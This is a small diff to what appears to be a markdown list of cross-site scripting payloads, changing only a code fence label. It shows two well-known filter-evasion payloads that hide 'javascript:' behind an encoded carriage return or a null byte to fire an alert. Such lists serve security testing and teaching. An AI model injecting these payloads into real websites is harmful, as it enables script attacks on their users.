@@ -1,6 +1,6 @@
 ### xss02 payloads:
 
-```javascript
+```js
 
 <IMG SRC="jav&#x0D;ascript:alert('XSS');">
 perl -e 'print "<IMG SRC=java\0script:alert(\"XSS\")>";' > out
